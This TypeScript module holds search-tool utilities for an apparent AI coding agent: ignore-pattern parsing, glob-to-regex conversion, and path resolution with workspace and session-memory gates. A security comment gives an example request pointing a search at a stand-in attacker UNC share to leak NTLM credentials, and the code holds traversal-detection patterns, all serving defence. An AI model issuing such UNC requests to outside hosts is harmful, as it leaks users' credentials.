/**
 * Shared utilities for advanced tools (Glob, Grep, WebSearch, WebFetch).
 *
 * Extracted from `advancedTools.ts` to keep the per-tool modules small
 * and avoid duplicating ignore-pattern logic, search-path resolution,
 * and glob-to-regex conversion.
 */

import fs from 'node:fs'
import path from 'node:path'

import { type ToolResult } from './tools'
import { getWorkspacePath, resolveWithDriftFallback } from '../tools/workspaceState'
import { getSessionAgentTypeForMemoryGates } from '../tools/sessionMemoryGateBridge'
import {
  isUnderSessionMemoryWritableRoot,
  isUncOrSmbStylePath,
  gateWorkspaceBoundary,
} from '../tools/fileToolValidation'
import { buildToolFailure } from '../tools/toolErrorFormat'
import {
  findClosestName,
  findExistingParentDir,
  listDirEntries,
} from '../tools/fuzzyPathError'

/** Hard ceiling on every `rg` invocation (ms). */
export const RG_SPAWNSYNC_TIMEOUT_MS = (() => {
  const raw = process.env.POLE_RG_TIMEOUT_MS
  const n = raw ? Number(raw) : NaN
  return Number.isFinite(n) && n > 0 ? n : 15_000
})()

// ========== .gitignore / .opencodeignore parsing ==========

/** Parse a .gitignore-style file into an array of patterns. */
function parseIgnoreFile(content: string): string[] {
  return content
    .split(/\r?\n/)
    .map(line => line.trim())
    .filter(line => line && !line.startsWith('#'))
    .map(line => line.endsWith('\\') ? line.slice(0, -1) : line)
}

/**
 * Convert ignore patterns to ripgrep --glob exclusions.
 * Returns array of ['--glob', '!pattern', ...] arguments.
 */
export function ignorePatternsToRgArgs(patterns: string[]): string[] {
  const args: string[] = []
  for (const p of patterns) {
    if (p.startsWith('/')) {
      args.push('--glob', '!' + p.slice(1))
    } else {
      args.push('--glob', '!**/' + p)
    }
  }
  return args
}

/**
 * Find and parse .gitignore/.opencodeignore files from startDir up to root.
 * Returns merged list of ripgrep --glob exclusion args.
 */
export function getIgnoreArgsForDir(startDir: string): string[] {
  const allPatterns: string[] = []
  let current = startDir
  const root = path.parse(current).root
  while (true) {
    for (const name of ['.gitignore', '.opencodeignore']) {
      const fp = path.join(current, name)
      try {
        const content = fs.readFileSync(fp, 'utf-8')
        allPatterns.push(...parseIgnoreFile(content))
      } catch { /* ignore missing */ }
    }
    if (current === root) break
    const parent = path.dirname(current)
    if (parent === current) break
    current = parent
  }
  return ignorePatternsToRgArgs(allPatterns)
}

/** Collect raw ignore patterns (not rg args) for JS walk filtering. */
export function collectIgnorePatternsForDir(startDir: string): string[] {
  const allPatterns: string[] = []
  let current = startDir
  const root = path.parse(current).root
  while (true) {
    for (const name of ['.gitignore', '.opencodeignore']) {
      const fp = path.join(current, name)
      try {
        const content = fs.readFileSync(fp, 'utf-8')
        allPatterns.push(...parseIgnoreFile(content))
      } catch { /* ignore missing */ }
    }
    if (current === root) break
    const parent = path.dirname(current)
    if (parent === current) break
    current = parent
  }
  return allPatterns
}

/**
 * Check if a relative path matches any ignore pattern.
 *
 * Pattern semantics roughly follow `.gitignore`:
 *
 *   - `foo/bar` or anything containing `**`: matched against the full
 *     relative path with {@link globToRegex}.
 *   - Plain pattern with no `/` (e.g. `node_modules`, `*.log`, `tmp`):
 *     matches if **any path segment** of `relPath` matches it. So
 *     `node_modules` ignores `node_modules` itself AND
 *     `node_modules/pkg/index.js` (test E36); `*.log` ignores both
 *     `error.log` and `logs/error.log`. The previous implementation
 *     only tested the basename, which silently leaked nested files
 *     for any non-IGNORE_DIRS user-defined directory entry.
 *   - Leading `/`: anchored to the workspace root — only matched against
 *     the full `relPath`, never against individual segments.
 */
export function matchesIgnorePattern(relPath: string, patterns: string[]): boolean {
  const segments = relPath.split('/').filter(Boolean)
  for (const p of patterns) {
    const anchored = p.startsWith('/')
    const cleanP = anchored ? p.slice(1) : p
    if (!cleanP) continue
    if (cleanP.includes('/') || cleanP.includes('**')) {
      const re = globToRegex(cleanP)
      if (re.test(relPath)) return true
      continue
    }
    if (anchored) {
      // Anchored single-segment pattern: match the first segment only.
      if (segments.length > 0 && globToRegex(cleanP).test(segments[0])) return true
      continue
    }
    // Unanchored single-segment pattern: any segment may match.
    const re = globToRegex(cleanP)
    for (const seg of segments) {
      if (seg === cleanP || re.test(seg)) return true
    }
  }
  return false
}

/** VCS + build/dependency dirs to skip during recursive walk. */
export const IGNORE_DIRS = new Set([
  'node_modules', '.git', '.svn', '.hg', '.bzr', '.jj', '.sl',
  '.vscode', '.idea', 'dist', 'dist-electron',
  '.next', '.nuxt', '__pycache__', '.cache', 'coverage', '.turbo',
  'bower_components', 'vendor', 'build', 'out',
])

/**
 * Split a glob string on commas and spaces, but preserve patterns with braces.
 */
export function splitGlobPatterns(input: string): string[] {
  const results: string[] = []
  const rawPatterns = input.split(/\s+/)
  for (const rawPattern of rawPatterns) {
    if (rawPattern.includes('{') && rawPattern.includes('}')) {
      results.push(rawPattern)
    } else {
      results.push(...rawPattern.split(',').filter(Boolean))
    }
  }
  return results.filter(Boolean)
}

/** Format limit/offset information for display in tool results. */
export function formatLimitInfo(appliedLimit: number | undefined, appliedOffset: number | undefined): string {
  const parts: string[] = []
  if (appliedLimit !== undefined) parts.push(`limit: ${appliedLimit}`)
  if (appliedOffset) parts.push(`offset: ${appliedOffset}`)
  return parts.join(', ')
}

/**
 * Split a brace-expansion alternatives list on commas at brace depth 0 only.
 * `'b{c,d},e'` → `['b{c,d}', 'e']` (NOT `['b{c', 'd}', 'e']`).
 * Square-bracket character classes are also depth-tracked so a literal `,`
 * inside `[…]` does not split the pattern. Backslash-escaped `,` / `{` / `}`
 * / `[` / `]` are treated as literals and never alter depth.
 */
function splitTopLevelCommas(input: string): string[] {
  const out: string[] = []
  let buf = ''
  let braceDepth = 0
  let bracketDepth = 0
  for (let k = 0; k < input.length; k++) {
    const c = input[k]
    if (c === '\\' && k + 1 < input.length) {
      buf += c + input[k + 1]
      k++
      continue
    }
    if (c === '{') braceDepth++
    else if (c === '}') braceDepth = Math.max(0, braceDepth - 1)
    else if (c === '[') bracketDepth++
    else if (c === ']') bracketDepth = Math.max(0, bracketDepth - 1)
    if (c === ',' && braceDepth === 0 && bracketDepth === 0) {
      out.push(buf)
      buf = ''
      continue
    }
    buf += c
  }
  out.push(buf)
  return out
}

/** Convert glob pattern to regex. */
export function globToRegex(pattern: string): RegExp {
  let i = 0
  let out = ''
  const len = pattern.length
  while (i < len) {
    const ch = pattern[i]
    if (ch === '*') {
      if (pattern[i + 1] === '*') {
        out += '.*'
        i += 2
        if (i < len && (pattern[i] === '/' || pattern[i] === '\\')) i++
      } else {
        out += '[^/]*'
        i++
      }
    } else if (ch === '?') {
      out += '[^/]'
      i++
    } else if (ch === '[') {
      let j = i + 1
      let classContent = '['
      if (j < len && pattern[j] === '!') {
        classContent += '^'
        j++
      }
      while (j < len && pattern[j] !== ']') {
        classContent += pattern[j]
        j++
      }
      if (j < len) {
        classContent += ']'
        j++
      }
      out += classContent
      i = j
    } else if (ch === '{') {
      let j = i + 1
      let braceContent = ''
      let depth = 1
      while (j < len && depth > 0) {
        if (pattern[j] === '{') depth++
        else if (pattern[j] === '}') depth--
        if (depth > 0) braceContent += pattern[j]
        j++
      }
      // Split on commas at brace-depth 0 only — a naive `split(',')` here
      // also splits commas inside nested braces (e.g. `a{b{c,d},e}` would
      // wrongly split the inner `c,d`), producing invalid alternative lists
      // and silently broken match results (test E29).
      const alternatives = splitTopLevelCommas(braceContent).map(alt => {
        try { return globToRegex(alt).source.replace(/^\^?\(\?:/, '').replace(/\)\$?$/, '') }
        catch { return alt.replace(/[.+^${}()|[\]\\]/g, '\\$&') }
      })
      out += `(?:${alternatives.join('|')})`
      i = j
    } else if ('.+^${}()|\\'.includes(ch)) {
      out += '\\' + ch
      i++
    } else {
      out += ch
      i++
    }
  }
  return new RegExp(`^(?:${out})$`, 'i')
}

// ========== Session-memory search gating ==========

/** Detect path traversal patterns in search parameters. */
export function sessionMemorySearchTraversalLooksUnsafe(raw: unknown): boolean {
  if (typeof raw !== 'string') return false
  const s = raw.trim()
  if (!s) return false
  if (/(^|[\\/])\.\.([\\/]|$)/.test(s)) return true
  if (path.isAbsolute(s)) return true
  if (/^[a-z]:[\\/]/i.test(s)) return true
  if (s.startsWith('\\\\') || s.startsWith('//')) return true
  return false
}

/** Gate search tools for session-memory-internal agents. */
export function gateSessionMemoryInternalSearchDir(
  baseDir: string,
  extraPatterns?: Array<unknown>,
): ToolResult | null {
  if (getSessionAgentTypeForMemoryGates() !== 'session-memory-internal') return null
  if (!isUnderSessionMemoryWritableRoot(baseDir)) {
    return {
      success: false,
      error:
        '[session-memory-internal] Access denied: Glob/Grep may only search within session-memory directories.',
    }
  }
  for (const p of extraPatterns ?? []) {
    if (sessionMemorySearchTraversalLooksUnsafe(p)) {
      return {
        success: false,
        error:
          '[session-memory-internal] Access denied: Glob/Grep pattern/include/exclude must be relative to the session-memory cwd (no `..` or absolute paths).',
      }
    }
  }
  return null
}

// ========== Search path resolution ==========

export type SearchPathResolution =
  | { ok: true; baseDir: string; singleFileTarget: string | null }
  | { ok: false; result: ToolResult }

/**
 * Walk `baseDir` shallowly, return the first file OR directory whose basename
 * shares a (case-insensitive) substring with `query`. Used to render a
 * "Did you mean …?" hint when a Grep/Glob path doesn't exist, saving the
 * model a retry on typos like `src/electonic` → `src/electron`.
 *
 * Files-only would miss the most common Grep/Glob mistake (wrong dir name),
 * so this scans dirs too. Caps at maxDepth + early-out on first hit to
 * keep cost trivial even on huge monorepos.
 */
function findSimilarSearchPath(
  query: string,
  baseDir: string,
  maxDepth: number = 4,
): string | null {
  const lowerQuery = query.toLowerCase()
  if (lowerQuery.length < 2) return null
  let hit: string | null = null
  function walk(dir: string, depth: number) {
    if (hit !== null || depth > maxDepth) return
    let entries: fs.Dirent[]
    try { entries = fs.readdirSync(dir, { withFileTypes: true }) } catch { return }
    for (const entry of entries) {
      if (hit !== null) return
      if (IGNORE_DIRS.has(entry.name)) continue
      if (entry.name.startsWith('.')) continue
      const lowerName = entry.name.toLowerCase()
      if (lowerName.includes(lowerQuery) || lowerQuery.includes(lowerName)) {
        hit = path.join(dir, entry.name)
        return
      }
      if (entry.isDirectory()) walk(path.join(dir, entry.name), depth + 1)
    }
  }
  walk(baseDir, 0)
  return hit
}

export function resolveSearchPath(rawCwd: string | undefined): SearchPathResolution {
  const workspace = getWorkspacePath()

  // SECURITY: Reject UNC / SMB-style paths before any fs.stat call. On
  // Windows, a `fs.stat('\\\\evil-host\\share')` triggers an SMB connection
  // that leaks the current user's NTLM hash to attacker-controlled hosts
  // (classic Responder / SMB relay setup). Write tools already block these
  // via `gateFileMutatePath`; Grep/Glob ran straight through `existsSync`/
  // `statSync` here, so a single "grep TODO in \\\\attacker.com\\share"
  // request was enough to leak credentials. Early-return short-circuits the
  // whole resolution loop without ever touching the filesystem.
  const trimmed = rawCwd?.trim() ?? ''
  if (trimmed) {
    const resolvedForUncCheck = path.isAbsolute(trimmed)
      ? trimmed
      : path.resolve(workspace ?? process.cwd(), trimmed)
    if (isUncOrSmbStylePath(trimmed, resolvedForUncCheck)) {
      return {
        ok: false,
        result: {
          success: false,
          ...buildToolFailure({
            what: `Refusing UNC/SMB path: ${rawCwd}`,
            tried: [trimmed],
            context: { workspace: workspace ?? '(none)', platform: process.platform },
            next:
              'UNC paths (\\\\host\\share, //host/share) are blocked because stat-ing them ' +
              'leaks NTLM credentials to the remote host. Use a local absolute or workspace-relative path.',
          }, 'validation'),
        },
      }
    }
  }

  const tried: string[] = []

  const candidates: string[] = []
  if (trimmed) {
    if (path.isAbsolute(trimmed)) {
      candidates.push(trimmed)
    } else {
      if (workspace) candidates.push(path.resolve(workspace, trimmed))
      candidates.push(path.resolve(trimmed))
    }
  } else {
    const fallback = workspace || process.cwd()
    candidates.push(fallback)
  }

  // Audit fix (2026-06, P1 R6) — search roots must respect the workspace
  // boundary (same realpath-aware policy + carve-outs as gateFileMutatePath's
  // workspace check; see fileToolValidation.gateWorkspaceBoundary). Applied
  // to the resolved hit rather than every candidate so error messages point
  // at the path that actually exists.
  const boundaryFailure = (resolvedHit: string): SearchPathResolution | null => {
    const gate = gateWorkspaceBoundary(resolvedHit, 'search')
    if (gate.ok) return null
    return {
      ok: false,
      result: {
        success: false,
        ...buildToolFailure({
          what: gate.error,
          tried: [resolvedHit],
          context: { workspace: workspace ?? '(none)', platform: process.platform },
          next:
            'Search inside the workspace (or the session-memory / memory / temp carve-outs), ' +
            'or read a specific file with read_file instead.',
        }, 'validation'),
      },
    }
  }

  // Two-pass probe: first try every candidate literally, then re-probe with
  // the LLM-drift fallback (curly quotes / fullwidth CJK punctuation) on the
  // misses. We split the loop so a candidate that literally exists wins over
  // a drift-resolved sibling of an earlier candidate — same ordering policy
  // as `resolvePathForTool`.
  for (const cand of candidates) {
    tried.push(cand)
    if (!fs.existsSync(cand)) continue
    try {
      const st = fs.statSync(cand)
      if (st.isDirectory()) {
        return boundaryFailure(cand) ?? { ok: true, baseDir: cand, singleFileTarget: null }
      }
      if (st.isFile()) {
        return (
          boundaryFailure(cand) ?? {
            ok: true,
            baseDir: path.dirname(cand),
            singleFileTarget: cand,
          }
        )
      }
    } catch {
      // Permission / transient
    }
  }
  for (const cand of candidates) {
    const drift = resolveWithDriftFallback(cand)
    if (!drift || drift === cand) continue
    try {
      const st = fs.statSync(drift)
      if (st.isDirectory()) {
        return boundaryFailure(drift) ?? { ok: true, baseDir: drift, singleFileTarget: null }
      }
      if (st.isFile()) {
        return (
          boundaryFailure(drift) ?? {
            ok: true,
            baseDir: path.dirname(drift),
            singleFileTarget: drift,
          }
        )
      }
    } catch {
      // Permission / transient
    }
  }

  // Build a rich "did you mean" listing without taking the
  // buildFuzzyNotFoundError fast-path — we want to keep the legacy
  // `Path not found:` headline that toolErrorShape.test.ts and
  // toolGrep.fileTarget.test.ts treat as contract. Inline the same
  // fuzzy logic (parent-dir listing + closest-sibling match +
  // workspace-wide basename scan) so Glob/Grep get the same hint
  // density as buildFuzzyNotFoundError without the wording change.
  const nextLines: string[] = []
  let suggestionLine = ''
  if (workspace && trimmed) {
    try {
      const queryBasename = path.basename(trimmed)
      if (queryBasename && queryBasename.length >= 2) {
        const found = findSimilarSearchPath(queryBasename, workspace)
        if (found) {
          const relFound = path.relative(workspace, found).replace(/\\/g, '/')
          // Keep the headline-level "Did you mean" line — toolErrorShape
          // and the model's first-pass error-summary read this first.
          suggestionLine = ` Did you mean "${relFound}"?`
        }
      }
    } catch { /* ignore suggestion errors */ }
  }

  // Parent-dir listing for the deepest existing ancestor of the input.
  // Mirrors buildFuzzyNotFoundError's loop, scoped to directories
  // because Glob/Grep paths are conventionally directories. The probe
  // path is the LAST candidate we tried so the ancestor walk lines up
  // with what the user actually requested.
  const probe = tried[tried.length - 1] ?? path.resolve(workspace ?? process.cwd(), trimmed || '.')
  const parentDir = findExistingParentDir(probe)
  if (parentDir) {
    const entries = listDirEntries(parentDir, 'dirs')
    const entriesBare = entries.map((e) => (e.endsWith('/') ? e.slice(0, -1) : e))
    const target = path.basename(probe)
    const closest = target ? findClosestName(target, entriesBare) : null
    const parentRel = workspace
      ? path.relative(workspace, parentDir).replace(/\\/g, '/') || '.'
      : parentDir
    if (closest && closest !== target) {
      const trailingSlash = entries.includes(`${closest}/`) ? '/' : ''
      const correctedRel = parentRel === '.' ? closest : `${parentRel}/${closest}`
      nextLines.push(
        `Did you mean "${correctedRel}${trailingSlash}"? It is the closest existing directory under the same parent.`,
      )
    }
    if (entries.length > 0) {
      const visible = entries.slice(0, 30)
      nextLines.push(
        `Subdirectories that DO exist under "${parentRel}/" ` +
          `(deepest existing ancestor of your input):` +
          visible.map((n) => `\n    - ${parentRel === '.' ? n : `${parentRel}/${n}`}`).join('') +
          (entries.length > visible.length ? `\n    … and ${entries.length - visible.length} more` : ''),
      )
    }
  }

  nextLines.push(
    workspace
      ? 'Use a path relative to the workspace root, an absolute path, or omit to search the whole workspace.'
      : 'No workspace is open. Provide an absolute path or open a workspace first.',
  )

  return {
    ok: false,
    result: {
      success: false,
      ...buildToolFailure({
        what: `Path not found: ${rawCwd || '(no path given)'}.${suggestionLine}`,
        tried,
        context: { workspace: workspace ?? '(none)', platform: process.platform },
        next: nextLines,
      }, 'not_found'),
    },
  }
}
